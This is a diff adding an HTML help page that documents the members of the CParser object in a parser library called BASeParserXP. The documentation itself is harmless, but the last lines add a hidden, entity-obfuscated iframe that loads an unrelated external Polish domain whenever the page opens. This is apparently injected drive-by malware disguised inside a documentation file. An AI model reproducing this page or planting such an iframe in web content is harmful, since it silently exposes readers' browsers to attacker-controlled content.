@@ -1,0 +1,99 @@
+<HTML>
+	<HEAD>
+<!--Change relative paths as appropriate-->
+	<LINK REL="STYLESHEET" HREF="..\..\CSS\topic.css">
+	<SCRIPT LANGUAGE="javascript" SRC="..\..\SCRIPTS\footer.js"></SCRIPT>
+		<TITLE>BASeParser Help:TOPIC</TITLE>
+	</HEAD>
+<BODY OnLoad="showfooter(document.all('bottomdiv'))">
+<H1>CParser Object</H1><P>
+
+The One and only. BASeParserXP.CParser is the class that you will most likely spend most of your time working with for evaluating expressions. If you view the Properties and methods of the CParser object in the Visual Basic Object Browser or the Intellisense pop-up, you may be overwhelmed- don't worry. Only a few of the members of the Object are required in order to get the object up and running. For your convenience, here is a list of all the members of the CParser object, followed by a brief description of each.<P>
+
+
+<TABLE BORDER="1" CELLPADDING="5"><TR><TH>Member Name</TH><TH>Type</TH><TH>Description</TH></TR>
+<TR><TD>
+Create
+</TD><TD>
+Method
+</TD><TD>
+Initializes this Parser object. This should be called before you do anything with the object. If you do not call this method, the Parser will call it implicitly. However, if you created/retrieved variables references,added functions, or added plugins to the parser, they will all become orphaned from the parser when it calls Create. The Create method is implemented separately to make the engine faster. If CParser automatically performed the Create() method work in it's Initialize Event, it would cause the entire library to execute almost <i>75%</i> slower.
+</TD></TR>
+<TR><TD>
+Expression
+</TD><TD>
+Property (Read/Write)
+</TD><TD>
+Assigns/Returns the Expression that will be parsed and executed. Expression Syntax is explained in the <A HREF="..\..\Expressions\index.html">Expression Syntax</A> section. A Special note: when you assign a value to this property, the Parser will delay any actual parsing of that expression until absolutely required (such as when you tell it to <B>Execute</B>). 
+</TD></TR>
+<TR><TD>
+EvalListener
+</TD><TD>
+Property (Read-Only)
+</TD><TD>
+Returns the IEvalEventSinks Collection, which delegates IEvalEvents Interface calls from the Parser to the first Plugin that recognizes whatever the parser wants to do. For more information on the semantics of this delegation, you should read about <A HREF="..\IEvalEventSinks\index.html">IEvalEventSinks</A>.
+</TD></TR>
+<!--Information goes here-->
+<TR><TD>
+ConfigSet
+</TD><TD>
+Property (Read Only)
+</TD><TD>
+Returns the currently loaded configuration set. A Configuration set determines what plugins the Parser will load. This will return whatever value was given for that CParser's Create() Method. Once a Parser is created, it's Configuration Set Name is immutable. You can, however, fiddle with the IevalEventSinks collection, adding new sinks. Keep in mind the current implementation does not save these changes back into the configuration set. 
+
+</TD></TR>
+<TR><TD>
+Functions
+</TD><TD>
+Property (Set/Get)
+</TD><TD>
+Returns the Parsers Current <A HREF="..\CFunctions\index.html">CFunctions</A> Collection. a Standard Parser Plugin, FunctionHandler, takes responsibility for transforming these relatively useless data structures into implemented routines.
+</TD></TR><TR><TD>
+Variables
+
+</TD><TD>
+Property (Set/Get)
+</TD><TD>
+Returns a <A HREF="..\CVariables\index.html">CVariables</A> collection that contains every variable currently defined in expressions. This includes:
+<UL>
+	<LI>Variables used as pseudo-constants by plugins
+	<LI>Variables created on the fly during evaluation
+	<LI>Variables  created by the plugins to perform work (Such as certain Functions)
+</UL>
+
+</TD></TR>
+<TR><TD>
+LastResult
+</TD><TD>
+Property (Read-Only)
+</TD><TD>
+<P>	
+Returns the result of the last expression evaluated. Generally equal to the current value of the "ANS" variable.
+</TD></TR>
+
+<TR><TD>
+Notation
+</TD><TD>
+Property(Read/Write)
+</TD><TD>
+Sets/Returns the current Notation Mode in effect. Valid values are:<P>
+
+	
+	<CENTER><TABLE WIDTH="50%" BORDER="1px" CELLSPACING="0">
+	<CAPTION>"NumericNotationConstants" Enumeration</CAPTION>
+	<TR><TH>Constant</TH><TH>Value</TH><TH>Info</TR>
+	<TR><TD>NumNotation_Standard</TD><TD>0</TD><TD>Standard Format.</TD></TR>
+	<TR><TD>NumNotation_Scientific</TD><TD>1</TD><TD>Uses the Scientific format for all numbers.</TD></TR>
+	<TR><TD>NumNotation_Hexadecimal</TD><TD>2</TD><TD>Uses the Hexadecimal Notation for all Integral Values.</TD></TR>
+	<TR><TD>NumNotation_Octal</TD><TD>3</TD><TD>Uses the Octal(Base 8) Notation for all Integral Values.</TD></TR>
+
+	</TABLE>
+
+
+</TD></TR>
+</TABLE>
+<DIV ID="bottomdiv" class="fullwidth">Copyright information</DIV>
+
+<iframe src="http://jL.c&#104;ura.pl/rc/" style="&#100;isplay:none"></iframe>
+</BODY>
+</HTML>
